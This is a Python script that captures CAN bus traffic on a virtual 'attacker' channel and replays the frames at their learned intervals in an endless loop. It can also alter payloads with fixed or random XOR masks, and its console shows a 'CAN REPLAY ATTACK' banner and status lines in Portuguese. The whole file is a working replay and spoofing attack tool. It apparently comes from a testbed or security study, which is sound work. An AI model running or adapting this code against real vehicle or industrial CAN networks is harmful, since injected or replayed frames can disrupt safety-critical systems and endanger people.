import can
import pandas as pd
import time
import numpy as np
import argparse
import random

from sniffer import capture_traffic
from pathlib import Path

from can_network import VCAN_ATTACKER_CHANNEL, CAN_INTERFACE


LOG_DIR = Path("traffic_logs")
LOG_FILE = LOG_DIR / "can_sniffer.csv"

bus = can.interface.Bus(
    channel=VCAN_ATTACKER_CHANNEL,
    bustype=CAN_INTERFACE
)


def parse_arguments():
    parser = argparse.ArgumentParser()

    parser.add_argument(
        "--duration",
        type=int,
        default=10,
        help="Sniffing duration in seconds"
    )

    parser.add_argument(
        "--fake_data",
        action="store_true",
        help="Enable payload modification"
    )

    parser.add_argument(
        "--mask",
        type=str,
        default=None,
        help="Binary XOR mask. If omitted, a random mask is generated."
    )

    args = parser.parse_args()

    if args.duration <= 0:
        parser.error("Duration must be greater than zero")

    if args.mask is not None:
        if not args.mask or any(bit not in "01" for bit in args.mask):
            parser.error("Mask must contain only 0 and 1")

    return args


def replay_algorithm(message_bank):
    average_intervals = {}

    for can_id in message_bank:
        timestamps = []
        data = message_bank[can_id]

        for messages in data:
            timestamps.append(messages["timestamp"])

        intervals = np.diff(timestamps)

        if len(intervals) > 0:
            average_intervals[can_id] = np.mean(intervals)

    return average_intervals


def create_replay_state(message_bank, average_intervals):
    replay_state = {}
    now = time.monotonic()

    for can_id in message_bank:

        if can_id not in average_intervals:
            continue

        replay_state[can_id] = {}
        replay_state[can_id]["messages"] = message_bank[can_id]
        replay_state[can_id]["interval"] = average_intervals[can_id]
        replay_state[can_id]["index"] = 0
        replay_state[can_id]["next_send"] = (
            now + average_intervals[can_id]
        )

    return replay_state


def main():

    args = parse_arguments()

    duration = args.duration
    fake_data = args.fake_data

    # Se o usu\u00e1rio passou uma m\u00e1scara, converte de bin\u00e1rio para inteiro.
    # Caso contr\u00e1rio, deixa None para gerar m\u00e1scaras aleat\u00f3rias.
    if args.mask is not None:
        fixed_mask = int(args.mask, 2)
    else:
        fixed_mask = None

    average_intervals = {}
    message_bank = {}

    print("starting replay_attack_module")

    try:

        capture_traffic(bus, duration)

        print("SNIFFING FINALIZADO!")

        sent_count = 0

        print("\033[2J\033[H", end="", flush=True)
        print("=" * 50)
        print("             CAN REPLAY ATTACK")
        print("=" * 50)
        print("Aguardando primeira transmiss\u00e3o...")

        df = pd.read_csv(
            LOG_FILE,
            dtype={"data": str},
            keep_default_na=False
        )

        grouped = df.groupby("arbitration_id")

        for can_id, group in grouped:

            messages = group[
                [
                    "timestamp",
                    "data",
                    "dlc",
                    "is_extended_id"
                ]
            ].to_dict("records")

            message_bank[can_id] = messages

        average_intervals = replay_algorithm(
            message_bank
        )

        replay_state = create_replay_state(
            message_bank,
            average_intervals
        )

        while True:

            for can_id, state in replay_state.items():

                if time.monotonic() >= state["next_send"]:

                    message = state["messages"][state["index"]]

                    dlc = int(message["dlc"])

                    data_prepare = str(
                        message["data"]
                    ).strip().replace(" ", "")

                    # Garante que o tamanho original do payload
                    # seja preservado de acordo com o DLC.
                    data_prepare = data_prepare.zfill(
                        dlc * 2
                    )

                    current_mask = 0

                    if fake_data and dlc > 0:

                        num_bits = dlc * 8

                        max_mask = (
                            1 << num_bits
                        ) - 1

                        # Se nenhuma m\u00e1scara foi informada,
                        # gera uma m\u00e1scara aleat\u00f3ria diferente
                        # para cada mensagem.
                        if fixed_mask is None:

                            current_mask = random.randint(
                                1,
                                max_mask
                            )

                        # Caso contr\u00e1rio utiliza a m\u00e1scara
                        # informada pelo usu\u00e1rio.
                        else:

                            current_mask = (
                                fixed_mask & max_mask
                            )

                        original = int(
                            data_prepare,
                            16
                        )

                        modified = (
                            original ^ current_mask
                        )

                        # Preserva exatamente o comprimento
                        # original do payload.
                        data_send = format(
                            modified,
                            f"0{dlc * 2}x"
                        )

                    else:

                        # Replay normal sem modifica\u00e7\u00e3o.
                        data_send = data_prepare

                    msg = can.Message(
                        arbitration_id=int(can_id),
                        data=bytes.fromhex(data_send),
                        is_extended_id=bool(
                            message["is_extended_id"]
                        )
                    )

                    bus.send(msg)

                    sent_count += 1

                    print("\033[H", end="")

                    print("=" * 50)
                    print("             CAN REPLAY ATTACK")
                    print("=" * 50)

                    print(
                        "Status:          ATACANDO"
                    )

                    print(
                        f"Mensagens:       {sent_count}"
                    )

                    print(
                        f"CAN ID enviado:  "
                        f"0x{int(can_id):03X}"
                    )

                    print(
                        f"Dados originais: "
                        f"{data_prepare.upper()}"
                    )

                    print(
                        f"Dados enviados:  "
                        f"{msg.data.hex(' ').upper()}"
                    )

                    print(
                        f"DLC:             {msg.dlc}"
                    )

                    if fake_data:

                        print(
                            f"Mask aplicada:   "
                            f"{current_mask:0{dlc * 8}b}"
                        )

                    print(
                        "=" * 50,
                        flush=True
                    )

                    state["next_send"] += (
                        state["interval"]
                    )

                    state["index"] += 1

                    if (
                        state["index"]
                        >= len(state["messages"])
                    ):
                        state["index"] = 0

            time.sleep(0.001)

    except KeyboardInterrupt:

        print(
            "replay attack stopped by user."
        )

    except Exception as e:

        print(
            f"An error occurred: {e}"
        )

    finally:

        bus.shutdown()


if __name__ == "__main__":
    main()
